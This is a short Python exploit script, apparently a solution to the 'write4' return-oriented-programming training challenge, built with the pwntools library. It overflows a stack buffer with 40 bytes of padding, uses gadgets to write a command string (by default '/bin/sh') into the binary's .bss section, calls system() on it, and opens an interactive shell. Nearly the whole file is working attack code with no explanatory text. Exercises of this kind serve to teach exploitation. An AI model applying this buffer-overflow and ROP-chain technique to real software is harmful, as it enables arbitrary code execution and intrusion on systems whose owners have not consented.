import pwn
import sys

# Setup enviroment
process = pwn.process("./write4")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("write4")

# Get cmd and pad
cmd = "/bin/sh" if len(sys.argv) == 1 else sys.argv[1]
cmd = cmd + 8 * "\x00" if len(cmd) % 8 == 0 else cmd + (8-(len(cmd)%8)) * "\x00"

# Generate rop
rop = pwn.ROP(elf)
for i in range(0, len(cmd), 8):
    rop.raw(rop.find_gadget(["pop r14", "pop r15", "ret"]))
    rop.raw(elf.bss()+i)
    rop.raw(cmd[i:i+8])
    pwn.log.info("Found gadget mov? " + str(rop.find_gadget(["mov r14, r15"])))
    rop.raw(elf.symbols["usefulGadgets"]) # mov r14, r15
rop.system(elf.bss())
pwn.log.info(rop.dump())

# Execute command
process.readline()
process.readline()
process.readline()
process.readline()
payload = "A" * 40 + rop.chain()
process.sendline(payload)
process.interactive()
